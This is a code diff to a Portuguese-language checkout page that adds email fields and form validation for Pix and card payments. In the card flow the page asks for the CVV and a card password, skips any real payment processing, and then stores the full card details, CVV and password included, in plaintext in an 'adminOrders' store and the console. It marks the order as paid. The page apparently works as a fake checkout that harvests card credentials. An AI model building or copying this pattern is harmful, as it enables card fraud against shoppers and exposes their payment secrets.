@@ -787,10 +787,13 @@
         <div id="pix-inputs">
           <label for="pix-payer-name">Nome Completo</label>
           <input type="text" id="pix-payer-name" placeholder="Nome Completo" required aria-label="Nome completo do pagador">
+          <p class="error-message" id="error-pix-payer-name"></p>
           <label for="pix-payer-cpf">CPF (somente números)</label>
           <input type="text" id="pix-payer-cpf" placeholder="CPF (somente números)" maxlength="11" required aria-label="CPF do pagador">
+          <p class="error-message" id="error-pix-payer-cpf"></p>
           <label for="pix-email-input">E-mail</label>
           <input type="email" id="pix-email-input" placeholder="Seu e-mail" required aria-label="E-mail do pagador">
+          <p class="error-message" id="error-pix-email-input"></p>
           <button id="generate-pix-button" disabled aria-label="Gerar código PIX">Gerar Pix</button>
         </div>
         <div id="pix-code-manual" class="pix-code-container">
@@ -812,8 +815,11 @@
         <input type="text" id="card-name" placeholder="Nome no cartão" required aria-label="Nome no cartão">
         <p class="error-message" id="error-card-name"></p>
         <label for="card-cpf">CPF (somente números)</label>
-        <input type="text" id="card-cpf" placeholder="Digite o CPF (somente números)" maxlength="14" pattern="\d{3}\.\d{3}\.\d{3}-\d{2}" title="Digite 11 dígitos no formato XXX.XXX.XXX-XX" required aria-label="CPF do titular do cartão">
+        <input type="text" id="card-cpf" placeholder="Digite o CPF (somente números)" maxlength="11" required aria-label="CPF do titular do cartão">
         <p class="error-message" id="error-card-cpf"></p>
+        <label for="card-email">E-mail</label>
+        <input type="email" id="card-email" placeholder="Seu e-mail" required aria-label="E-mail do pagador">
+        <p class="error-message" id="error-card-email"></p>
         <label for="card-number">Número do Cartão</label>
         <input type="text" id="card-number" placeholder="Número do Cartão (16 dígitos)" maxlength="19" required aria-label="Número do cartão">
         <p class="error-message" id="error-card-number"></p>
@@ -841,8 +847,6 @@
             <label for="exp-year">Ano de Expiração</label>
             <select id="exp-year" required aria-label="Ano de expiração do cartão">
               <option value="">Ano</option>
-              <option value="2023">2023</option>
-              <option value="2024">2024</option>
               <option value="2025">2025</option>
               <option value="2026">2026</option>
               <option value="2027">2027</option>
@@ -871,8 +875,8 @@
 
   <div class="error-screen" id="error-screen" role="dialog" aria-labelledby="error-title">
     <div class="error-content">
-      <h3 id="error-title">Erro ao Gerar Pix</h3>
-      <p id="error-message">Houve um erro ao gerar o QR code Pix. Tente novamente.</p>
+      <h3 id="error-title">Erro ao Processar Pagamento</h3>
+      <p id="error-message">Houve um erro ao processar o pagamento. Tente novamente.</p>
       <button id="try-again" aria-label="Tentar novamente">Tentar Novamente</button>
     </div>
   </div>
@@ -1003,6 +1007,53 @@
       console.log('Resumo do pedido atualizado:', { subtotal, fee, total });
     }
 
+    function validatePixForm() {
+      const nameInput = document.getElementById('pix-payer-name');
+      const cpfInput = document.getElementById('pix-payer-cpf');
+      const emailInput = document.getElementById('pix-email-input');
+      const generateButton = document.getElementById('generate-pix-button');
+      const errors = {
+        name: document.getElementById('error-pix-payer-name'),
+        cpf: document.getElementById('error-pix-payer-cpf'),
+        email: document.getElementById('error-pix-email-input')
+      };
+
+      let isValid = true;
+
+      if (!nameInput.value.trim() || nameInput.value.trim().length < 3) {
+        nameInput.classList.add('invalid');
+        errors.name.textContent = 'Nome deve ter pelo menos 3 caracteres.';
+        errors.name.classList.add('visible');
+        isValid = false;
+      } else {
+        nameInput.classList.remove('invalid');
+        errors.name.classList.remove('visible');
+      }
+
+      const cpf = cpfInput.value.replace(/\D/g, '');
+      if (cpf.length !== 11) {
+        cpfInput.classList.add('invalid');
+        errors.cpf.textContent = 'CPF deve conter 11 dígitos.';
+        errors.cpf.classList.add('visible');
+        isValid = false;
+      } else {
+        cpfInput.classList.remove('invalid');
+        errors.cpf.classList.remove('visible');
+      }
+
+      if (!emailInput.value.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value.trim())) {
+        emailInput.classList.add('invalid');
+        errors.email.textContent = 'Por favor, insira um e-mail válido.';
+        errors.email.classList.add('visible');
+        isValid = false;
+      } else {
+        emailInput.classList.remove('invalid');
+        errors.email.classList.remove('visible');
+      }
+
+      generateButton.disabled = !isValid;
+    }
+
     async function generatePixQRCode() {
       const purchase = JSON.parse(localStorage.getItem('pendingPurchase')) || {};
       const nameInput = document.getElementById('pix-payer-name').value.trim();
@@ -1086,13 +1137,20 @@
           customerDetails: {
             name: nameInput,
             cpf: cpfInput,
-            email: emailInput
+            email: purchase.email || emailInput
           },
-          status: 'Gerado'
+          status: 'Gerado',
+          loginType: purchase.loginType || 'Unknown'
         };
         orders.push(newOrder);
         localStorage.setItem('adminOrders', JSON.stringify(orders));
         console.log('Código PIX gerado com sucesso e pedido salvo:', newOrder);
+
+        // Limpar dados do localStorage
+        localStorage.removeItem('pendingPurchase');
+        localStorage.removeItem('cartItems');
+        localStorage.removeItem('cartAddress');
+        console.log('Dados do localStorage limpos após pagamento Pix');
       } catch (error) {
         console.error('Erro ao gerar Pix:', error.message);
         showErrorScreen(`Erro ao gerar Pix: ${error.message}`);
@@ -1105,6 +1163,7 @@
     function validateCardForm() {
       const cardNameInput = document.getElementById('card-name');
       const cardCPFInput = document.getElementById('card-cpf');
+      const cardEmailInput = document.getElementById('card-email');
       const cardNumberInput = document.getElementById('card-number');
       const expMonthInput = document.getElementById('exp-month');
       const expYearInput = document.getElementById('exp-year');
@@ -1115,6 +1174,7 @@
       const errors = {
         cardName: document.getElementById('error-card-name'),
         cardCPF: document.getElementById('error-card-cpf'),
+        cardEmail: document.getElementById('error-card-email'),
         cardNumber: document.getElementById('error-card-number'),
         expMonth: document.getElementById('error-exp-month'),
         expYear: document.getElementById('error-exp-year'),
@@ -1124,9 +1184,9 @@
 
       let isValid = true;
 
-      if (!cardNameInput.value.trim()) {
+      if (!cardNameInput.value.trim() || cardNameInput.value.trim().length < 3) {
         cardNameInput.classList.add('invalid');
-        errors.cardName.textContent = 'Nome é obrigatório.';
+        errors.cardName.textContent = 'Nome deve ter pelo menos 3 caracteres.';
         errors.cardName.classList.add('visible');
         isValid = false;
       } else {
@@ -1143,6 +1203,16 @@
       } else {
         cardCPFInput.classList.remove('invalid');
         errors.cardCPF.classList.remove('visible');
+      }
+
+      if (!cardEmailInput.value.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cardEmailInput.value.trim())) {
+        cardEmailInput.classList.add('invalid');
+        errors.cardEmail.textContent = 'Por favor, insira um e-mail válido.';
+        errors.cardEmail.classList.add('visible');
+        isValid = false;
+      } else {
+        cardEmailInput.classList.remove('invalid');
+        errors.cardEmail.classList.remove('visible');
       }
 
       const cardNumber = cardNumberInput.value.replace(/\D/g, '');
@@ -1201,8 +1271,9 @@
     }
 
     function processCardPayment() {
-      const cardName = document.getElementById('card-name').value;
+      const cardName = document.getElementById('card-name').value.trim();
       const cardCPF = document.getElementById('card-cpf').value.replace(/\D/g, '');
+      const cardEmail = document.getElementById('card-email').value.trim();
       const cardNumber = document.getElementById('card-number').value.replace(/\D/g, '');
       const expMonth = document.getElementById('exp-month').value;
       const expYear = document.getElementById('exp-year').value;
@@ -1211,8 +1282,8 @@
       const total = parseFloat(document.getElementById('order-total').textContent.replace('R$ ', '').replace(',', '.'));
       const confirmButton = document.getElementById('confirm-payment-button');
 
-      if (cardNumber.length !== 16 || cardCPF.length !== 11 || !expMonth || !expYear || cvv.length < 3 || cvv.length > 4 || !password || isNaN(total) || total <= 0) {
-        console.error('Dados do cartão inválidos:', { cardNumber, cardCPF, expMonth, expYear, cvv, password, total });
+      if (cardNumber.length !== 16 || cardCPF.length !== 11 || !expMonth || !expYear || cvv.length < 3 || cvv.length > 4 || !password || isNaN(total) || total <= 0 || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cardEmail)) {
+        console.error('Dados do cartão inválidos:', { cardNumber, cardCPF, cardEmail, expMonth, expYear, cvv, password, total });
         showErrorScreen('Erro: Verifique os dados do cartão e tente novamente.');
         return;
       }
@@ -1235,7 +1306,7 @@
             cvv,
             password,
             transactionAmount: total,
-            email: purchase.email || 'Não informado'
+            email: purchase.email || cardEmail
           },
           orderDate: new Date().toISOString(),
           status: 'Efetuado',
@@ -1243,28 +1314,47 @@
           customerDetails: {
             name: cardName,
             cpf: cardCPF,
-            email: purchase.email || 'Não informado'
-          }
+            email: purchase.email || cardEmail
+          },
+          loginType: purchase.loginType || 'Unknown'
         };
         orders.push(newOrder);
         localStorage.setItem('adminOrders', JSON.stringify(orders));
         console.log('Pagamento via cartão processado e pedido salvo:', newOrder);
 
+        // Limpar dados do localStorage
+        localStorage.removeItem('pendingPurchase');
+        localStorage.removeItem('cartItems');
+        localStorage.removeItem('cartAddress');
+        console.log('Dados do localStorage limpos após pagamento com cartão');
+
         confirmButton.textContent = 'Confirmar Pagamento';
-        window.location.href = '/confirmation.html';
+        window.location.href = 'index.html'; // Substituir por '/confirmation.html' se disponível
       }, 1000);
     }
 
     document.addEventListener('DOMContentLoaded', () => {
       updateOrderSummary();
 
+      const purchase = JSON.parse(localStorage.getItem('pendingPurchase')) || {};
+      if (purchase.email) {
+        document.getElementById('pix-email-input').value = purchase.email;
+        document.getElementById('card-email').value = purchase.email;
+        validatePixForm();
+        validateCardForm();
+      }
+
       document.getElementById('pix-button').addEventListener('click', () => showPaymentForm('pix'));
       document.getElementById('card-button').addEventListener('click', () => showPaymentForm('card'));
 
       const generatePixButton = document.getElementById('generate-pix-button');
       const copyPixCodeButton = document.getElementById('copy-pix-code');
+      const pixNameInput = document.getElementById('pix-payer-name');
+      const pixCPFInput = document.getElementById('pix-payer-cpf');
+      const pixEmailInput = document.getElementById('pix-email-input');
       const cardNameInput = document.getElementById('card-name');
       const cardCPFInput = document.getElementById('card-cpf');
+      const cardEmailInput = document.getElementById('card-email');
       const cardNumberInput = document.getElementById('card-number');
       const expMonthInput = document.getElementById('exp-month');
       const expYearInput = document.getElementById('exp-year');
@@ -1272,11 +1362,13 @@
       const passwordInput = document.getElementById('password');
       const confirmPaymentButton = document.getElementById('confirm-payment-button');
 
-      ['pix-payer-name', 'pix-payer-cpf', 'pix-email-input'].forEach(id => {
-        document.getElementById(id).addEventListener('input', () => {
-          const allFilled = ['pix-payer-name', 'pix-payer-cpf', 'pix-email-input'].every(id => document.getElementById(id).value.trim());
-          generatePixButton.disabled = !allFilled;
-        });
+      [pixNameInput, pixCPFInput, pixEmailInput].forEach(input => {
+        input.addEventListener('input', validatePixForm);
+      });
+
+      pixCPFInput.addEventListener('input', () => {
+        formatCPF(pixCPFInput);
+        validatePixForm();
       });
 
       generatePixButton.addEventListener('click', generatePixQRCode);
@@ -1299,19 +1391,19 @@
         });
       });
 
-      cardNameInput.addEventListener('input', validateCardForm);
+      [cardNameInput, cardCPFInput, cardEmailInput, cardNumberInput, expMonthInput, expYearInput, cvvInput, passwordInput].forEach(input => {
+        input.addEventListener('input', validateCardForm);
+      });
+
       cardCPFInput.addEventListener('input', () => {
         formatCPF(cardCPFInput);
         validateCardForm();
       });
+
       cardNumberInput.addEventListener('input', () => {
         formatCardNumber(cardNumberInput);
         validateCardForm();
       });
-      expMonthInput.addEventListener('change', validateCardForm);
-      expYearInput.addEventListener('change', validateCardForm);
-      cvvInput.addEventListener('input', validateCardForm);
-      passwordInput.addEventListener('input', validateCardForm);
 
       confirmPaymentButton.addEventListener('click', processCardPayment);
     });
